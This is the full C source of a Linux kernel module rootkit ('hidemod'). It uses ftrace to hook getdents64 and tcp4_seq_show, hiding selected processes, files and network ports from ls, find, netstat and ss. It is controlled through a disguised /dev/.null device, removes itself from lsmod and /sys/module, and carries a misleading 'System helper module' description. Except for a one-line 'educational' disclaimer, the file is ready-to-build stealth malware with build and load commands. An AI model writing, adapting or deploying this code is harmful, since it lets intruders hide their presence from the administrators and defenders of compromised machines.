/*
 * hidemod.c — Linux Loadable Kernel Module for process/file/network hiding.
 *
 * Uses ftrace-based syscall hooking (Linux 5.7+) to avoid writing to the
 * read-only syscall table.  Hooks:
 *   - getdents64  → hide /proc/<pid> entries and data files from ls/find
 *   - tcp4_seq_show → hide network connections from netstat/ss
 *
 * Control interface:  character device /dev/.null  (innocuous name)
 *   ioctl commands:  HIDE_PID, UNHIDE_PID, HIDE_PREFIX, HIDE_PORT
 *
 * Module self-hides from lsmod / /proc/modules after loading.
 *
 * Build:
 *   make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
 *
 * Load:
 *   insmod hidemod.ko
 *
 * EDUCATIONAL PURPOSE ONLY.
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/miscdevice.h>
#include <linux/uaccess.h>
#include <linux/dirent.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/list.h>
#include <linux/string.h>
#include <linux/tcp.h>
#include <linux/seq_file.h>
#include <linux/namei.h>
#include <linux/proc_fs.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("system");
MODULE_DESCRIPTION("System helper module");

/* ── ioctl command definitions ─────────────────────────────────── */

#define HIDEMOD_IOC_MAGIC   'H'
#define HIDE_PID            _IOW(HIDEMOD_IOC_MAGIC, 1, int)
#define UNHIDE_PID          _IOW(HIDEMOD_IOC_MAGIC, 2, int)
#define HIDE_PREFIX         _IOW(HIDEMOD_IOC_MAGIC, 3, char[256])
#define HIDE_PORT           _IOW(HIDEMOD_IOC_MAGIC, 4, unsigned short)
#define UNHIDE_PORT         _IOW(HIDEMOD_IOC_MAGIC, 5, unsigned short)

/* ── Hidden item storage ───────────────────────────────────────── */

#define MAX_HIDDEN_PIDS     32
#define MAX_HIDDEN_PREFIXES 16
#define MAX_HIDDEN_PORTS    16
#define MAX_PREFIX_LEN      256

static int    hidden_pids[MAX_HIDDEN_PIDS];
static int    hidden_pid_count = 0;

static char   hidden_prefixes[MAX_HIDDEN_PREFIXES][MAX_PREFIX_LEN];
static int    hidden_prefix_count = 0;

static unsigned short hidden_ports[MAX_HIDDEN_PORTS];
static int    hidden_port_count = 0;

static DEFINE_MUTEX(hide_mutex);

/* ── Helpers: check if something should be hidden ──────────────── */
/*
 * These run in syscall-hot paths and MUST NOT take hide_mutex.
 * Instead we use READ_ONCE on the count and array elements so
 * readers never see torn values.  The ioctl handler uses
 * WRITE_ONCE to update elements, then a final smp_store_release
 * on the count so the new element is visible before the count
 * increment.  This is safe because:
 *   - count only ever grows (or swaps the last element on remove)
 *   - readers tolerate seeing a slightly stale (smaller) count
 *   - individual array slots are word-sized (int / unsigned short)
 */

static bool is_pid_hidden(int pid)
{
    int i, count = READ_ONCE(hidden_pid_count);
    for (i = 0; i < count; i++) {
        if (READ_ONCE(hidden_pids[i]) == pid)
            return true;
    }
    return false;
}

static bool is_name_hidden(const char *name)
{
    int i, count = READ_ONCE(hidden_prefix_count);
    for (i = 0; i < count; i++) {
        /* Each prefix slot is written fully before the count is
         * bumped, so reading the string here is safe.           */
        if (strncmp(name, hidden_prefixes[i],
                    strlen(hidden_prefixes[i])) == 0)
            return true;
    }
    return false;
}

static bool is_port_hidden(unsigned short port)
{
    int i, count = READ_ONCE(hidden_port_count);
    for (i = 0; i < count; i++) {
        if (READ_ONCE(hidden_ports[i]) == port)
            return true;
    }
    return false;
}

/* ── ftrace hook infrastructure ────────────────────────────────── */
/*
 * On Linux 5.7+ the syscall table is not directly writable.
 * We use ftrace to hook functions instead.  This is the same
 * approach used by modern rootkits (AveRootkit, mod-rootkit).
 */

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t ksym_lookup;
#endif

static unsigned long lookup_name(const char *name)
{
#ifdef KPROBE_LOOKUP
    return ksym_lookup(name);
#else
    return kallsyms_lookup_name(name);
#endif
}

/* ftrace hook structure */
struct ftrace_hook {
    const char       *name;
    void             *function;     /* our replacement */
    void             *original;     /* saved original  */
    unsigned long     address;
    struct ftrace_ops ops;
};

static int resolve_hook_address(struct ftrace_hook *hook)
{
    hook->address = lookup_name(hook->name);
    if (!hook->address) {
        pr_debug("hidemod: symbol not found: %s\n", hook->name);
        return -ENOENT;
    }
    *((unsigned long *)hook->original) = hook->address;
    return 0;
}

static void notrace ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                                  struct ftrace_ops *ops,
                                  struct ftrace_regs *fregs)
{
    struct pt_regs *regs = ftrace_get_regs(fregs);
    struct ftrace_hook *hook =
        container_of(ops, struct ftrace_hook, ops);

    /* Skip if called from within our module (avoid recursion) */
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook->function;
}

static int install_hook(struct ftrace_hook *hook)
{
    int err;

    err = resolve_hook_address(hook);
    if (err)
        return err;

    hook->ops.func = ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
                    | FTRACE_OPS_FL_RECURSION
                    | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        pr_debug("hidemod: ftrace_set_filter_ip failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err) {
        pr_debug("hidemod: register_ftrace_function failed: %d\n", err);
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return err;
    }

    return 0;
}

static void remove_hook(struct ftrace_hook *hook)
{
    unregister_ftrace_function(&hook->ops);
    ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
}

/* ── Hooked getdents64 ─────────────────────────────────────────── */
/*
 * Filters directory entries to hide:
 *   1. /proc/<hidden_pid>  entries
 *   2. Files matching hidden prefixes
 */

typedef asmlinkage long (*orig_getdents64_t)(
    const struct pt_regs *regs);
static orig_getdents64_t orig_getdents64;

static asmlinkage long hooked_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent;
    struct linux_dirent64 *current_dir, *prev_dir = NULL;
    struct linux_dirent64 *kern_buf;
    long ret, orig_ret, bpos;
    int pid_val;

    /* Call the original getdents64 */
    ret = orig_getdents64(regs);
    if (ret <= 0)
        return ret;

    /* Save the original count so we can fall back on copy failure */
    orig_ret = ret;

    dirent = (struct linux_dirent64 __user *)regs->si;

    kern_buf = kmalloc(ret, GFP_KERNEL);
    if (!kern_buf)
        return ret;

    if (copy_from_user(kern_buf, dirent, ret)) {
        kfree(kern_buf);
        return ret;
    }

    /* Walk the directory entries and remove hidden ones */
    bpos = 0;
    while (bpos < ret) {
        current_dir = (struct linux_dirent64 *)((char *)kern_buf + bpos);
        bool hide = false;

        /* Check if this is a PID entry (numeric name) */
        if (kstrtoint(current_dir->d_name, 10, &pid_val) == 0) {
            if (is_pid_hidden(pid_val))
                hide = true;
        }

        /* Check prefix-based hiding */
        if (!hide && is_name_hidden(current_dir->d_name))
            hide = true;

        if (hide) {
            /* Remove this entry by shifting remaining data */
            long reclen = current_dir->d_reclen;
            long remaining = ret - bpos - reclen;

            if (remaining > 0) {
                memmove(current_dir,
                        (char *)current_dir + reclen,
                        remaining);
            }
            ret -= reclen;
            /* Don't advance bpos — new entry is at same offset */
        } else {
            prev_dir = current_dir;
            bpos += current_dir->d_reclen;
        }
    }

    /* Copy modified buffer back to userspace.
     * On failure, return the unmodified original count so userspace
     * sees the real (unfiltered) data it already has in its buffer
     * rather than a truncated length with stale contents.            */
    if (copy_to_user(dirent, kern_buf, ret)) {
        kfree(kern_buf);
        return orig_ret;
    }

    kfree(kern_buf);
    return ret;
}

/* ── Hooked tcp4_seq_show (hide network connections) ───────────── */

typedef int (*orig_tcp4_seq_show_t)(struct seq_file *seq, void *v);
static orig_tcp4_seq_show_t orig_tcp4_seq_show;

static int hooked_tcp4_seq_show(struct seq_file *seq, void *v)
{
    int ret;
    struct sock *sk;

    if (v == SEQ_START_TOKEN)
        return orig_tcp4_seq_show(seq, v);

    sk = (struct sock *)v;
    if (sk && sk->sk_num && is_port_hidden(sk->sk_num))
        return 0;  /* Skip this entry entirely */

    if (sk && sk->sk_dport && is_port_hidden(ntohs(sk->sk_dport)))
        return 0;

    ret = orig_tcp4_seq_show(seq, v);
    return ret;
}

/* ── ftrace hook table ─────────────────────────────────────────── */

static struct ftrace_hook hooks[] = {
    {
        .name     = "__x64_sys_getdents64",
        .function = hooked_getdents64,
        .original = &orig_getdents64,
    },
    {
        .name     = "tcp4_seq_show",
        .function = hooked_tcp4_seq_show,
        .original = &orig_tcp4_seq_show,
    },
};

#define HOOK_COUNT (sizeof(hooks) / sizeof(hooks[0]))

/* ── ioctl control device ──────────────────────────────────────── */

static long hidemod_ioctl(struct file *file, unsigned int cmd,
                          unsigned long arg)
{
    int pid;
    unsigned short port;
    char prefix[MAX_PREFIX_LEN];

    mutex_lock(&hide_mutex);

    switch (cmd) {
    case HIDE_PID:
        if (copy_from_user(&pid, (int __user *)arg, sizeof(pid))) {
            mutex_unlock(&hide_mutex);
            return -EFAULT;
        }
        if (hidden_pid_count < MAX_HIDDEN_PIDS) {
            /* Write element first, then release-store the count
             * so readers (via READ_ONCE) see the element before
             * the incremented count.                              */
            WRITE_ONCE(hidden_pids[hidden_pid_count], pid);
            smp_store_release(&hidden_pid_count,
                              hidden_pid_count + 1);
        }
        break;

    case UNHIDE_PID:
        if (copy_from_user(&pid, (int __user *)arg, sizeof(pid))) {
            mutex_unlock(&hide_mutex);
            return -EFAULT;
        }
        {
            int i;
            for (i = 0; i < hidden_pid_count; i++) {
                if (hidden_pids[i] == pid) {
                    int new_count = hidden_pid_count - 1;
                    WRITE_ONCE(hidden_pids[i],
                               hidden_pids[new_count]);
                    smp_store_release(&hidden_pid_count,
                                      new_count);
                    break;
                }
            }
        }
        break;

    case HIDE_PREFIX:
        memset(prefix, 0, sizeof(prefix));
        if (copy_from_user(prefix, (char __user *)arg,
                           MAX_PREFIX_LEN - 1)) {
            mutex_unlock(&hide_mutex);
            return -EFAULT;
        }
        prefix[MAX_PREFIX_LEN - 1] = '\0';
        if (hidden_prefix_count < MAX_HIDDEN_PREFIXES) {
            /* Copy the full string into the slot first … */
            strncpy(hidden_prefixes[hidden_prefix_count],
                    prefix, MAX_PREFIX_LEN);
            /* … then make it visible to lock-free readers. */
            smp_store_release(&hidden_prefix_count,
                              hidden_prefix_count + 1);
        }
        break;

    case HIDE_PORT:
        if (copy_from_user(&port, (unsigned short __user *)arg,
                           sizeof(port))) {
            mutex_unlock(&hide_mutex);
            return -EFAULT;
        }
        if (hidden_port_count < MAX_HIDDEN_PORTS) {
            WRITE_ONCE(hidden_ports[hidden_port_count], port);
            smp_store_release(&hidden_port_count,
                              hidden_port_count + 1);
        }
        break;

    case UNHIDE_PORT:
        if (copy_from_user(&port, (unsigned short __user *)arg,
                           sizeof(port))) {
            mutex_unlock(&hide_mutex);
            return -EFAULT;
        }
        {
            int i;
            for (i = 0; i < hidden_port_count; i++) {
                if (hidden_ports[i] == port) {
                    int new_count = hidden_port_count - 1;
                    WRITE_ONCE(hidden_ports[i],
                               hidden_ports[new_count]);
                    smp_store_release(&hidden_port_count,
                                      new_count);
                    break;
                }
            }
        }
        break;

    default:
        mutex_unlock(&hide_mutex);
        return -EINVAL;
    }

    mutex_unlock(&hide_mutex);
    return 0;
}

static const struct file_operations hidemod_fops = {
    .owner          = THIS_MODULE,
    .unlocked_ioctl = hidemod_ioctl,
    .compat_ioctl   = hidemod_ioctl,
};

/* Use miscdevice for simpler registration (auto-creates /dev node) */
static struct miscdevice hidemod_dev = {
    .minor = MISC_DYNAMIC_MINOR,
    .name  = ".null",            /* /dev/.null — innocuous name */
    .fops  = &hidemod_fops,
    .mode  = 0600,               /* root-only access */
};

/* ── Module self-hiding ────────────────────────────────────────── */

static struct list_head *module_prev;
static bool module_hidden = false;

static void hide_module(void)
{
    if (module_hidden)
        return;

    /* Remove from /proc/modules (lsmod) */
    module_prev = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);

    /* Remove from /sys/module/ */
    kobject_del(&THIS_MODULE->mkobj.kobj);

    module_hidden = true;
}

/* ── Module init / exit ────────────────────────────────────────── */

static int __init hidemod_init(void)
{
    int err, i;

#ifdef KPROBE_LOOKUP
    /* Resolve kallsyms_lookup_name via kprobe trick (5.7+) */
    if (register_kprobe(&kp) < 0)
        return -ENOENT;
    ksym_lookup = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);
    if (!ksym_lookup)
        return -ENOENT;
#endif

    /* Register control device */
    err = misc_register(&hidemod_dev);
    if (err) {
        pr_debug("hidemod: misc_register failed: %d\n", err);
        return err;
    }

    /* Install ftrace hooks */
    for (i = 0; i < HOOK_COUNT; i++) {
        err = install_hook(&hooks[i]);
        if (err) {
            /* Unwind already-installed hooks */
            while (--i >= 0)
                remove_hook(&hooks[i]);
            misc_deregister(&hidemod_dev);
            return err;
        }
    }

    /* Self-hide from lsmod and /sys/module */
    hide_module();

    pr_debug("hidemod: loaded\n");
    return 0;
}

static void __exit hidemod_exit(void)
{
    int i;

    /* Restore module visibility so rmmod works cleanly */
    if (module_hidden && module_prev) {
        list_add(&THIS_MODULE->list, module_prev);
        module_hidden = false;
    }

    /* Remove all hooks */
    for (i = 0; i < HOOK_COUNT; i++)
        remove_hook(&hooks[i]);

    misc_deregister(&hidemod_dev);

    pr_debug("hidemod: unloaded\n");
}

module_init(hidemod_init);
module_exit(hidemod_exit);
